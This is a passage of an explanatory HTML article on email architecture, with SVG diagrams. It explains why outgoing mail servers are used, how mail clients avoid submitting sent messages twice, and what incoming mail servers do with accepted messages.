</summary>

  <p>Before we discuss why we need outgoing mail servers,
let’s first have a look at what the modified architecture would look like:</p>

  <figure>
    <svg id="figure-simplified-architecture-without-outgoing" data-name="simplified-architecture-without-outgoing" width="599.148" height="298.25" viewBox="-131.662 -5 599.148 298.25" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <path d="M -0.312,250.25 A 77.394 165.5 0 0 1 -77.706,84.75 L -77.706447,84.740008" marker-end="url(#arrow-gray)" stroke-dasharray="190"></path>
    <text text-anchor="end">
        <tspan x="-60.121" y="224.146"><tspan>imap</tspan> for</tspan><tspan x="-60.121" y="246.146">message</tspan><tspan x="-60.121" y="268.146">storage</tspan>
    </text>
    <line x1="283.118" y1="208.188" x2="283.118" y2="84.75" marker-end="url(#arrow)" stroke-dasharray="116"></line>
    <text text-anchor="start">
        <tspan x="295.118" y="129.9"><tspan>imap</tspan> or <tspan>pop3</tspan></tspan><tspan x="295.118" y="151.9">for message</tspan><tspan x="295.118" y="173.9">retrieval</tspan>
    </text>
    <line x1="105.725" y1="41.75" x2="229.162" y2="41.75" marker-end="url(#arrow)" stroke-dasharray="116"></line>
    <text text-anchor="middle">
        <tspan x="167.912" y="7.75"><tspan>smtp</tspan> for</tspan><tspan x="167.912" y="29.75">message relay</tspan>
    </text>
    <line x1="52.706" y1="208.188" x2="52.706" y2="84.75" marker-end="url(#arrow)" stroke-dasharray="116"></line>
    <text text-anchor="end">
        <tspan x="40.706" y="129.9"><tspan>smtp</tspan> for</tspan><tspan x="40.706" y="151.9">message</tspan><tspan x="40.706" y="173.9">submission</tspan>
    </text>
    <path d="M 52.706,208.188 A 176.456 166.438 0 0 1 229.162,41.75 L 229.172101,41.74992" marker-end="url(#arrow-red)" stroke-dasharray="262"></path>
    <text text-anchor="start">
        <tspan x="113.118" y="110.232"><tspan>smtp</tspan> for</tspan><tspan x="113.118" y="132.232">direct</tspan><tspan x="113.118" y="154.232">message</tspan><tspan x="113.118" y="176.232">delivery?</tspan>
    </text>
    <rect x="0" y="208.5" width="105.412" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="52.706" y="245.15"><tspan>Mail client</tspan></tspan><tspan x="52.706" y="267.15">of sender</tspan>
    </text>
    <rect x="0" y="0" width="105.412" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="52.706" y="25.65"><tspan>Outgoing</tspan></tspan><tspan x="52.706" y="47.65"><tspan>mail server</tspan></tspan><tspan x="52.706" y="69.65">of sender</tspan>
    </text>
    <rect x="230.412" y="0" width="105.412" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="283.118" y="25.65"><tspan>Incoming</tspan></tspan><tspan x="283.118" y="47.65"><tspan>mail server</tspan></tspan><tspan x="283.118" y="69.65">of recipient</tspan>
    </text>
    <rect x="230.412" y="208.5" width="105.412" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="283.118" y="245.15"><tspan>Mail client</tspan></tspan><tspan x="283.118" y="267.15">of recipient</tspan>
    </text>
    <rect x="-130.412" y="0" width="105.412" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="-77.706" y="25.65"><tspan>Incoming</tspan></tspan><tspan x="-77.706" y="47.65"><tspan>mail server</tspan></tspan><tspan x="-77.706" y="69.65">of sender</tspan>
    </text>
    <rect x="360.824" y="0" width="105.412" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="413.53" y="25.65"><tspan>Outgoing</tspan></tspan><tspan x="413.53" y="47.65"><tspan>mail server</tspan></tspan><tspan x="413.53" y="69.65">of recipient</tspan>
    </text>
    <line x1="0" y1="0" x2="105.412" y2="83.5"></line>
    <line x1="0" y1="83.5" x2="105.412" y2="0"></line>
    <line x1="360.824" y1="0" x2="466.236" y2="83.5"></line>
    <line x1="360.824" y1="83.5" x2="466.236" y2="0"></line>

</svg>

    <figcaption>
A hypothetical email architecture without outgoing mail servers.
</figcaption>
  </figure>

  <p>Since outgoing mail servers are just a piece of software and can thus be integrated into mail clients,
it is technically possible to send emails directly to the incoming mail server of each recipient.
In fact, sending an email to someone <a href="#extended-simple-mail-transfer-protocol">from the command line</a>
is my favorite demonstration in the seminars I give.
Only badly configured incoming mail servers accept such messages, though.</p>

  <p>There are <a href="https://superuser.com/questions/1006079/why-do-i-need-an-smtp-server">two main reasons</a>
why outgoing mail servers are used in practice:</p>
  <ul>
    <li><strong>Shift work from the client to the server</strong>:
Unlike the mail client, which runs on the user’s device,
the outgoing mail server typically has a fast and permanent Internet connection.
For example, when you send an email from your smartphone,
your Internet connection might be slow and also expensive
due to <a href="https://en.wikipedia.org/wiki/Roaming">roaming</a>.
When you switch off your smartphone on an airplane or overnight,
its mail client is offline for several hours.
Thus, it makes sense to implement the following features on a server:
      <ul>
        <li><strong>Retry after unsuccessful delivery</strong>:
As we will see in the <a href="#incoming-mail-server">next section</a>,
an incoming mail server can reject a message for a number of reasons.
One reason is simply to <a href="#graylisting">deter spammers</a>,
who often won’t attempt to transmit the message again.
An incoming mail server might also be unreachable due to maintenance or malfunctioning.
While Internet outages are rare in most areas of the world,
it might happen that a communication link is temporarily unavailable.
This is why <a href="https://datatracker.ietf.org/doc/html/rfc5321#section-4.5.4.1">the standard demands</a>
that messages which cannot be delivered immediately
have to be queued and their transmission retried by the sender
after a delay of at least 30 minutes for several days.</li>
        <li><strong>Send a single message to several recipients</strong>:
If you send an email to several recipients,
your mail client submits the email only once to the outgoing mail server.
The outgoing mail server then delivers a copy of the email to each recipient.
This is especially useful when you send a big attachment
to many recipients over a bad Internet connection.</li>
        <li><strong>Batch messages for delivery</strong>:
In the early days of email, access to the Internet was expensive
and you often paid for the duration of your connection rather than for the volume of transmitted data.
Since machines were permanently connected only in the local network of your organization,
it made sense to collect outgoing mail from members on a local server
and then deliver the messages once a link had been established.
Given that most organizations pay a flat rate for their Internet access nowadays,
this aspect is only of historic relevance.</li>
      </ul>
    </li>
    <li><strong>Reduce spam and phishing</strong>:
Unsolicited mail is an annoyance, both in the analog and the digital world.
Unless we <a href="#applications-of-cryptographic-hash-functions">impose a cost</a> on the sender,
it’s impossible to eliminate <a href="#spam">spam</a> completely in a decentralized system
in which everyone is allowed to participate.
Being able to <a href="#spoofing">spoof the sender of an email</a>,
which is often used for <a href="#phishing">phishing</a>,
is a real security concern.
System administrators deploy the following measures to curb the two problems,
which require the use of outgoing mail servers:
      <ul>
        <li><strong>Blocked connections</strong>:
Incoming mail servers listen on <a href="#port-numbers">port 25</a> for new messages.
An <a href="https://en.wikipedia.org/wiki/Internet_service_provider">Internet service provider (<abbr title="Internet Service Provider">ISP</abbr>)</a>
can prevent emails from being sent from its network
by <a href="https://en.wikipedia.org/wiki/Egress_filtering">blocking</a>
all outgoing connections with a <a href="https://evalapply.org/internet/#port-numbers">destination port</a> of 25.
Its customers can still connect to an outgoing mail server on <a href="#port-numbers">port 587</a>,
which has to be in a different network
or explicitly <a href="https://en.wikipedia.org/wiki/Whitelisting">whitelisted</a> by the <abbr title="Internet Service Provider">ISP</abbr>
in order to be able to deliver messages on behalf of its users.
This measure makes it technically infeasible to send emails
directly to the incoming mail server of a recipient.
Many <a href="https://en.wikipedia.org/wiki/Internet_hosting_service">Internet hosting providers</a>
also block outgoing traffic on port 25 by default
to fight spam and to protect the reputation of their <abbr title="Internet Protocol">IP</abbr> address range.
For some providers,
such as <a href="https://www.linode.com/blog/linode/a-new-policy-to-help-fight-spam/">Linode</a>,
you can contact their customer service to lift this restriction,
for other providers,
such as <a href="https://www.digitalocean.com/community/questions/port-25-465-is-blocked-how-can-i-enable-it">DigitalOcean</a>,
the restriction is permanent.</li>
        <li><strong>Address reputation</strong>:
Incoming mail servers learn the sources of legitimate email over time.
Messages coming from such sources are likely to be delivered to the user’s inbox.
Messages from sources with a bad reputation are often dropped on arrival.
Messages from unknown sources are either dropped or put into the user’s spam folder.
<a href="https://en.wikipedia.org/wiki/Reputation_system">Reputation</a>
is crucial to build trust among unverified participants.
Even when the sender of an email is authenticated,
reputation remains at the core of any effort to fight spam.
As we will see <a href="#reputation">later on</a>,
you have to buy into the reputation of others
if you want to have your emails delivered reliably to your customers.
A whole industry has developed around this value proposition.
Since building a reputation as a trustworthy email sender yourself
is too much of a struggle for most Internet users and companies,
the port restriction mentioned in the previous bullet point isn’t much of a problem in practice.</li>
        <li><strong>User authentication</strong>:
Mailbox providers are incentivized to protect their reputation
because users would no longer use their service if emails are no longer delivered reliably.
This is why mailbox providers impose sending limits on their users
and delete accounts when misbehavior is reported to them,
which is possible only if they authenticate their users before relaying messages.
For example, <a href="https://support.google.com/a/answer/166852">Gmail limits</a>
the number of messages per day to 2’000 and the number of recipients per message to 100
if the message is submitted from a mail client rather than the web interface.
Vouching for users could also be done differently,
for example by <a href="https://evalapply.org/internet/#public-key-infrastructure">delegating trust</a>
to mail clients with <a href="https://evalapply.org/internet/#digital-signatures">digital signatures</a>.
However, a mailbox provider could no longer rate limit and filter outgoing messages
if mail clients delivered them directly.</li>
        <li><strong>Domain authentication</strong>:
When it comes to information security,
trust is good but control is better.
Spam is a problem of quantity:
You simply want to bring the volume of unsolicited messages to a bearable level.
Phishing, on the other hand, is a problem of quality:
A single successful attack can cause a lot of damage.
A reputation system is great for fighting spam but not good enough for fighting phishing.
The <a href="#delivery-protocols">email delivery protocol</a> itself doesn’t prevent the sender
from putting an arbitrary address into the <code>From</code> field.
In the absence of a mechanism to authenticate the sender,
you can only hope that email servers with a good reputation don’t misuse their reputation
and send messages with spoofed sender addresses and malicious content to you.
The idea behind <a href="#domain-authentication">domain authentication</a> is that each domain owner can specify
which outgoing mail servers are allowed to send messages from their domain.
Incoming mail servers can then verify
whether the sender of a message is indeed authorized to send messages from the claimed domain.
In combination with user authentication,
where outgoing mail servers prevent their users from sending messages in the name of another user at the same domain,
the two mechanisms guarantee that the sender of a message owns the claimed <code>From</code> address.
There would be other ways to achieve a similar result without requiring outgoing mail servers,
but this is how email works.</li>
      </ul>
    </li>
  </ul>

  <figure>
    <svg id="figure-simplified-architecture-authentication-copy" data-name="simplified-architecture-authentication-copy" width="599.148" height="298.25" viewBox="-131.662 -5 599.148 298.25" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <path d="M -77.706,83.813 A 76.456 166.438 0 0 0 -1.25,250.25 L -1.24009,250.251342" marker-end="url(#arrow-gray)" stroke-dasharray="190"></path>
    <text text-anchor="end">
        <tspan x="-60.322" y="223.906">User</tspan><tspan x="-60.322" y="245.906">authen-</tspan><tspan x="-60.322" y="267.906">tication</tspan>
    </text>
    <line x1="283.118" y1="83.813" x2="283.118" y2="207.25" marker-end="url(#arrow)" stroke-dasharray="116"></line>
    <text text-anchor="start">
        <tspan x="295.118" y="129.9">User</tspan><tspan x="295.118" y="151.9">authen-</tspan><tspan x="295.118" y="173.9">tication</tspan>
    </text>
    <line x1="230.1" y1="41.75" x2="106.662" y2="41.75" marker-end="url(#arrow-green)" stroke-dasharray="116"></line>
    <text text-anchor="middle">
        <tspan x="167.912" y="7.75">Domain</tspan><tspan x="167.912" y="29.75">authentication</tspan>
    </text>
    <line x1="52.706" y1="83.813" x2="52.706" y2="207.25" marker-end="url(#arrow-green)" stroke-dasharray="116"></line>
    <text text-anchor="end">
        <tspan x="40.706" y="129.9">User</tspan><tspan x="40.706" y="151.9">authen-</tspan><tspan x="40.706" y="173.9">tication</tspan>
    </text>
    <rect x="0" y="208.5" width="105.412" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="52.706" y="245.15"><tspan>Mail client</tspan></tspan><tspan x="52.706" y="267.15">of sender</tspan>
    </text>
    <rect x="0" y="0" width="105.412" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="52.706" y="25.65"><tspan>Outgoing</tspan></tspan><tspan x="52.706" y="47.65"><tspan>mail server</tspan></tspan><tspan x="52.706" y="69.65">of sender</tspan>
    </text>
    <rect x="230.412" y="0" width="105.412" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="283.118" y="25.65"><tspan>Incoming</tspan></tspan><tspan x="283.118" y="47.65"><tspan>mail server</tspan></tspan><tspan x="283.118" y="69.65">of recipient</tspan>
    </text>
    <rect x="230.412" y="208.5" width="105.412" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="283.118" y="245.15"><tspan>Mail client</tspan></tspan><tspan x="283.118" y="267.15">of recipient</tspan>
    </text>
    <rect x="-130.412" y="0" width="105.412" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="-77.706" y="25.65"><tspan>Incoming</tspan></tspan><tspan x="-77.706" y="47.65"><tspan>mail server</tspan></tspan><tspan x="-77.706" y="69.65">of sender</tspan>
    </text>
    <rect x="360.824" y="0" width="105.412" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="413.53" y="25.65"><tspan>Outgoing</tspan></tspan><tspan x="413.53" y="47.65"><tspan>mail server</tspan></tspan><tspan x="413.53" y="69.65">of recipient</tspan>
    </text>

</svg>

    <figcaption>
The incoming mail server verifies that the outgoing mail server is authorized to send messages from the claimed domain,
while the outgoing mail server of the sender ensures that each user uses their own address in the <code>From</code> field.
</figcaption>
  </figure>

  <p>As we will see in the <a href="#double-submission-problem">next box</a>,
having an <a href="https://en.wikipedia.org/wiki/Audit_trail">audit trail</a>
of sent emails is not among the reasons why outgoing mail servers are used.
And while an outgoing mail server could be useful to hide your <abbr title="Internet Protocol">IP</abbr> address from the recipients,
many outgoing mail servers <a href="#sender-towards-recipients">leak your <abbr title="Internet Protocol">IP</abbr> address</a>
in a <a href="#trace-information"><code>Received</code> header field</a>.
Privacy could be one of the reasons for using an outgoing mail server but often isn’t.</p>

</details>

<details>
  <summary id="double-submission-problem">
How to avoid submitting the same message to both the outgoing mail server and the incoming mail server?
</summary>

  <p>If you want to keep a record of all emails that you’ve sent,
your mail client has to store each outgoing message in the sent folder on your incoming mail server.
Since we focussed on how an email gets to its recipient so far,
this aspect has been grayed out in the above <a href="#simplified-architecture">architecture diagrams</a>.
In most cases, the client has to submit the same message twice:
Once to the outgoing mail server for delivering the message to the recipients,
and once to the incoming mail server for updating the sent folder.</p>

  <figure>
    <svg id="figure-simplified-architecture-double-submission" data-name="simplified-architecture-double-submission" width="599.148" height="298.25" viewBox="-131.662 -5 599.148 298.25" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <path d="M -0.312,250.25 A 77.394 165.5 0 0 1 -77.706,84.75 L -77.706447,84.740008" marker-end="url(#arrow-blue)" stroke-dasharray="190"></path>
    <text text-anchor="end">
        <tspan x="-60.121" y="224.146"><tspan>imap</tspan> for</tspan><tspan x="-60.121" y="246.146">message</tspan><tspan x="-60.121" y="268.146">storage</tspan>
    </text>
    <line x1="283.118" y1="208.188" x2="283.118" y2="84.75" marker-end="url(#arrow-gray)" stroke-dasharray="116"></line>
    <text text-anchor="start">
        <tspan x="295.118" y="129.9"><tspan>imap</tspan> or <tspan>pop3</tspan></tspan><tspan x="295.118" y="151.9">for message</tspan><tspan x="295.118" y="173.9">retrieval</tspan>
    </text>
    <line x1="105.725" y1="41.75" x2="229.162" y2="41.75" marker-end="url(#arrow-gray)" stroke-dasharray="116"></line>
    <text text-anchor="middle">
        <tspan x="167.912" y="7.75"><tspan>smtp</tspan> for</tspan><tspan x="167.912" y="29.75">message relay</tspan>
    </text>
    <line x1="52.706" y1="208.188" x2="52.706" y2="84.75" marker-end="url(#arrow-green)" stroke-dasharray="116"></line>
    <text text-anchor="end">
        <tspan x="40.706" y="129.9"><tspan>smtp</tspan> for</tspan><tspan x="40.706" y="151.9">message</tspan><tspan x="40.706" y="173.9">submission</tspan>
    </text>
    <rect x="0" y="208.5" width="105.412" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="52.706" y="245.15"><tspan>Mail client</tspan></tspan><tspan x="52.706" y="267.15">of sender</tspan>
    </text>
    <rect x="0" y="0" width="105.412" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="52.706" y="25.65"><tspan>Outgoing</tspan></tspan><tspan x="52.706" y="47.65"><tspan>mail server</tspan></tspan><tspan x="52.706" y="69.65">of sender</tspan>
    </text>
    <rect x="230.412" y="0" width="105.412" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="283.118" y="25.65"><tspan>Incoming</tspan></tspan><tspan x="283.118" y="47.65"><tspan>mail server</tspan></tspan><tspan x="283.118" y="69.65">of recipient</tspan>
    </text>
    <rect x="230.412" y="208.5" width="105.412" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="283.118" y="245.15"><tspan>Mail client</tspan></tspan><tspan x="283.118" y="267.15">of recipient</tspan>
    </text>
    <rect x="-130.412" y="0" width="105.412" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="-77.706" y="25.65"><tspan>Incoming</tspan></tspan><tspan x="-77.706" y="47.65"><tspan>mail server</tspan></tspan><tspan x="-77.706" y="69.65">of sender</tspan>
    </text>
    <rect x="360.824" y="0" width="105.412" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="413.53" y="25.65"><tspan>Outgoing</tspan></tspan><tspan x="413.53" y="47.65"><tspan>mail server</tspan></tspan><tspan x="413.53" y="69.65">of recipient</tspan>
    </text>

</svg>

    <figcaption>
The mail client submits the same message to both the outgoing mail server and the incoming mail server.
</figcaption>
  </figure>

  <p>For a bandwidth-limited mail client, this is not ideal.
There are four different approaches to avoid this double submission:</p>

  <ul>
    <li><strong>Always <code>Bcc</code> yourself</strong>:
You can configure most mail clients to add yourself as a <code>Bcc</code> recipient whenever you compose an email.
The outgoing mail server then delivers a copy of each message to your inbox.
The downside of this method is that your copy doesn’t include the other <code>Bcc</code> recipients.
Moreover, sent and received messages aren’t separated, which may be <a href="#client-innovation">desirable</a>.</li>
  </ul>

  <figure>
    <svg id="figure-double-submission-bcc" data-name="double-submission-bcc" width="310.72" height="165" viewBox="-1.25 -1.25 310.72 165" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <line x1="205.168" y1="30.75" x2="103.99" y2="30.75" marker-end="url(#arrow-green)" stroke-dasharray="94"></line>
    <text text-anchor="middle">
        <tspan x="154.11" y="18.75">2. Send</tspan>
    </text>
    <path d="M 205.793,142.75 A 51.058 80 0 0 0 256.85,62.75 L 256.850381,62.74" marker-end="url(#arrow-green)" stroke-dasharray="97"></path>
    <text text-anchor="end">
        <tspan x="235.44" y="109.203">1. Submit</tspan>
    </text>
    <rect x="102.74" y="123" width="102.74" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="154.11" y="148.65"><tspan>Mail client</tspan></tspan>
    </text>
    <rect x="0" y="0" width="102.74" height="61.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="51.37" y="25.65"><tspan>Incoming</tspan></tspan><tspan x="51.37" y="47.65"><tspan>mail server</tspan></tspan>
    </text>
    <rect x="205.48" y="0" width="102.74" height="61.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="256.85" y="25.65"><tspan>Outgoing</tspan></tspan><tspan x="256.85" y="47.65"><tspan>mail server</tspan></tspan>
    </text>

</svg>

    <figcaption>
The outgoing mail server sends a copy to your inbox.
</figcaption>
  </figure>

  <ul>
    <li><a href="https://support.google.com/mail/answer/78892"><strong>Gmail</strong></a>:
Google’s outgoing mail server automatically stores a copy of sent messages in the user’s sent folder.
In order not to end up with
<a href="https://www.msoutlook.info/question/prevent-duplicate-sent-items-gmail">duplicates in the sent folder</a>,
the mail client shouldn’t store sent messages in the user’s mailbox.
Since the mail client
<a href="https://stackoverflow.com/questions/30729128/how-to-determine-the-smtp-server-save-send-mails-or-not">cannot detect</a>
this non-standard behavior when submitting a message to the outgoing mail server,
either the mail client has to treat <code>@gmail.com</code> addresses differently
or the user has to disable the option to save a copy in the sent folder manually.
Since mail clients <a href="#bcc-removal">remove the <code>Bcc</code> field</a> before <a href="#submission-versus-relay">submission</a>,
<a href="#gmail-bcc-recovery">Gmail recovers it</a> from the <a href="#message-versus-envelope">envelope of the message</a>.</li>
  </ul>

  <figure>
    <svg id="figure-double-submission-gmail" data-name="double-submission-gmail" width="310.72" height="165" viewBox="-1.25 -1.25 310.72 165" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <line x1="205.168" y1="30.75" x2="103.99" y2="30.75" marker-end="url(#arrow-blue)" stroke-dasharray="94"></line>
    <text text-anchor="middle">
        <tspan x="154.11" y="18.75">2. Store</tspan>
    </text>
    <path d="M 205.793,142.75 A 51.058 80 0 0 0 256.85,62.75 L 256.850381,62.74" marker-end="url(#arrow-green)" stroke-dasharray="97"></path>
    <text text-anchor="end">
        <tspan x="235.44" y="109.203">1. Submit</tspan>
    </text>
    <rect x="102.74" y="123" width="102.74" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="154.11" y="148.65"><tspan>Mail client</tspan></tspan>
    </text>
    <rect x="0" y="0" width="102.74" height="61.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="51.37" y="25.65"><tspan>Incoming</tspan></tspan><tspan x="51.37" y="47.65"><tspan>mail server</tspan></tspan>
    </text>
    <rect x="205.48" y="0" width="102.74" height="61.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="256.85" y="25.65"><tspan>Outgoing</tspan></tspan><tspan x="256.85" y="47.65"><tspan>mail server</tspan></tspan>
    </text>

</svg>

    <figcaption>
Gmail automatically stores sent messages.
</figcaption>
  </figure>

  <ul>
    <li><a href="http://www.courier-mta.org/imap/INSTALL.html#imapsend"><strong>Courier-<abbr title="Internet Message Access Protocol">IMAP</abbr></strong></a>:
The <a href="https://en.wikipedia.org/wiki/Courier_Mail_Server">Courier Mail Server</a>
has a configuration option to designate a mailbox folder as a special outbox folder.
When the mail client stores a message in this folder,
the server sends the message to the addresses listed in the <code>To</code>, <code>Cc</code> and <code>Bcc</code> fields.
What makes this approach interesting is that a mail client can use <abbr title="Internet Message Access Protocol">IMAP</abbr> for everything
and no longer needs to support <abbr title="Simple Mail Transfer Protocol">SMTP</abbr>.
Unfortunately, this feature is also not standardized
and mail clients can therefore not rely on its availability.</li>
  </ul>

  <figure>
    <svg id="figure-double-submission-courier" data-name="double-submission-courier" width="310.72" height="165" viewBox="-1.25 -1.25 310.72 165" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <line x1="103.053" y1="30.75" x2="204.23" y2="30.75" marker-end="url(#arrow-green)" stroke-dasharray="94"></line>
    <text text-anchor="middle">
        <tspan x="154.11" y="18.75">2. Submit</tspan>
    </text>
    <path d="M 102.428,142.75 A 51.058 80 0 0 1 51.37,62.75 L 51.369573,62.740013" marker-end="url(#arrow-blue)" stroke-dasharray="97"></path>
    <text text-anchor="start">
        <tspan x="72.78" y="109.203">1. Store</tspan>
    </text>
    <rect x="102.74" y="123" width="102.74" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="154.11" y="148.65"><tspan>Mail client</tspan></tspan>
    </text>
    <rect x="0" y="0" width="102.74" height="61.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="51.37" y="25.65"><tspan>Incoming</tspan></tspan><tspan x="51.37" y="47.65"><tspan>mail server</tspan></tspan>
    </text>
    <rect x="205.48" y="0" width="102.74" height="61.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="256.85" y="25.65"><tspan>Outgoing</tspan></tspan><tspan x="256.85" y="47.65"><tspan>mail server</tspan></tspan>
    </text>

</svg>

    <figcaption>
The Courier <abbr title="Internet Message Access Protocol">IMAP</abbr> server can deliver emails.
</figcaption>
  </figure>

  <ul>
    <li><a href="https://datatracker.ietf.org/doc/html/rfc5550"><strong>Lemonade profile</strong></a>:
The only standardized solution to the double-submission problem
is a collection of extensions to <a href="#internet-message-access-protocol"><abbr title="Internet Message Access Protocol">IMAP</abbr></a>
and <a href="#submission-versus-relay"><abbr title="Simple Mail Transfer Protocol">SMTP</abbr> submission</a>,
which is called the <a href="https://en.wikipedia.org/wiki/Lemonade_Profile">lemonade profile</a>.
The <a href="https://datatracker.ietf.org/doc/html/rfc4467"><code>URLAUTH</code> extension</a> to <abbr title="Internet Message Access Protocol">IMAP</abbr>
allows mail clients to create references to mailbox data,
which include the required authorization to access the data.
The <a href="https://datatracker.ietf.org/doc/html/rfc4468"><code>BURL</code> extension</a> to <abbr title="Simple Mail Transfer Protocol">SMTP</abbr> submission
allows mail clients to instruct the outgoing mail server to fetch data from the user’s mailbox.
If the mail servers support these two extensions,
the mail client can upload the message to be sent to the user’s mailbox on the incoming mail server
and then instruct the outgoing mail server to deliver this message.</li>
  </ul>

  <figure>
    <svg id="figure-double-submission-lemonade" data-name="double-submission-lemonade" width="310.72" height="165" viewBox="-1.25 -1.25 310.72 165" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <line x1="205.168" y1="30.75" x2="103.99" y2="30.75" marker-end="url(#arrow-blue)" stroke-dasharray="94"></line>
    <text text-anchor="middle">
        <tspan x="154.11" y="18.75">3. Fetch</tspan>
    </text>
    <path d="M 205.793,142.75 A 51.058 80 0 0 0 256.85,62.75 L 256.850381,62.74" marker-end="url(#arrow-green)" stroke-dasharray="97"></path>
    <text text-anchor="end">
        <tspan x="235.44" y="109.203">2. Reference</tspan>
    </text>
    <path d="M 102.428,142.75 A 51.058 80 0 0 1 51.37,62.75 L 51.369573,62.740013" marker-end="url(#arrow-blue)" stroke-dasharray="97"></path>
    <text text-anchor="start">
        <tspan x="72.78" y="109.203">1. Store</tspan>
    </text>
    <rect x="102.74" y="123" width="102.74" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="154.11" y="148.65"><tspan>Mail client</tspan></tspan>
    </text>
    <rect x="0" y="0" width="102.74" height="61.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="51.37" y="25.65"><tspan>Incoming</tspan></tspan><tspan x="51.37" y="47.65"><tspan>mail server</tspan></tspan>
    </text>
    <rect x="205.48" y="0" width="102.74" height="61.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="256.85" y="25.65"><tspan>Outgoing</tspan></tspan><tspan x="256.85" y="47.65"><tspan>mail server</tspan></tspan>
    </text>

</svg>

    <figcaption>
The lemonade profile enables the outgoing mail server to fetch content for delivery from the incoming mail server.
</figcaption>
  </figure>

  <p>The lemonade profile includes additional extensions,
such as the <a href="https://datatracker.ietf.org/doc/html/rfc4469"><code>CATENATE</code> extension</a> to <abbr title="Internet Message Access Protocol">IMAP</abbr>
and the <a href="https://datatracker.ietf.org/doc/html/rfc2920"><code>PIPELINING</code> extension</a> to <abbr title="Simple Mail Transfer Protocol">SMTP</abbr>.
The former allows mail clients to compose new messages based on existing messages directly on the <abbr title="Internet Message Access Protocol">IMAP</abbr> server.
This makes it possible to forward large attachments without having to download and upload them first.
The latter allows clients to send several commands in a row
without having to wait for a response from the server between them.
This reduces the number of <a href="https://evalapply.org/internet/#network-performance">round trips</a>,
which makes communication over large distances much faster.</p>

</details>

<h3 id="incoming-mail-server">Incoming mail server</h3>

<p>The incoming mail server waits for connections from outgoing mail servers of other users.
When an outgoing mail server connects to transmit a message,
the incoming mail server records the message together with <a href="#trace-information">other information from the session</a>,
such as the sender’s <abbr title="Internet Protocol">IP</abbr> address.
The incoming mail server can reject the incoming message for a number of reasons:
The recipient might not exist, their mailbox might be full,
the message might be <a href="#size-limit">too long</a>,
or the sender might not be <a href="#reputation">trusted</a>.
If the message is rejected,
the outgoing mail server can either try to retransmit it at some later point
or inform the user about the <a href="#bounce-messages">failed delivery</a>.
If, on the other hand, the incoming mail server accepts the message,
it also assumes responsibility for delivering the message.
If it fails to do so,
for example when the message needs to be <a href="#alias-address">forwarded</a>,
then the incoming mail server should notify the author of the message.</p>

<p>Once the session with the outgoing mail server is over,
the incoming mail server adds the <a href="#trace-information">additional information</a>
collected during the session to the top of the accepted message.
It then evaluates whether the message is likely <a href="#spam">spam</a>.
Depending on the score of this evaluation,
the message is either delivered to the recipient’s inbox,
quarantined to the recipient’s spam folder,
or discarded without notifying the author.
While the last option violates the principle
that mail is either delivered or returned,
the alternative is often <a href="#backscatter">worse</a>.
This is why the standard <a href="https://datatracker.ietf.org/doc/html/rfc5321#section-6.2">explicitly allows</a>
incoming mail servers to drop received messages silently.
If the receiving address is an <a href="#alias-address">alias</a>,
the incoming mail server forwards the message to the configured email address
instead of delivering it to an inbox.
In case the address denotes a <a href="#mailing-list">mailing list</a>,
the incoming mail server sends the message to all subscribers of the list.
The incoming mail server also applies <a href="#email-filtering">filters</a>
and generates <a href="#automatic-responses">automatic responses</a>,
such as <a href="#bounce-messages">delivery failures</a>
and <a href="#out-of-office-replies">out-of-office replies</a>.</p>

<p>The incoming mail server waits for connections from mail clients on a different interface.
In order to access the mailbox of its user, the mail client has to present appropriate
<a href="https://en.wikipedia.org/wiki/Credential#Information_technology">credentials</a>.
The user’s email address and password are often used to authenticate the client,
which is granted unlimited access to the mailbox on success.
If the incoming mail server supports <a href="https://en.wikipedia.org/wiki/OAuth">OAuth</a>,
the mail client can present an <a href="https://en.wikipedia.org/wiki/Access_token">access token</a>
to gain potentially limited access to the user’s mailbox.
The <a href="https://developers.google.com/gmail/api/auth/scopes">scopes offered by Gmail</a>
are an example of what limited access can look like.
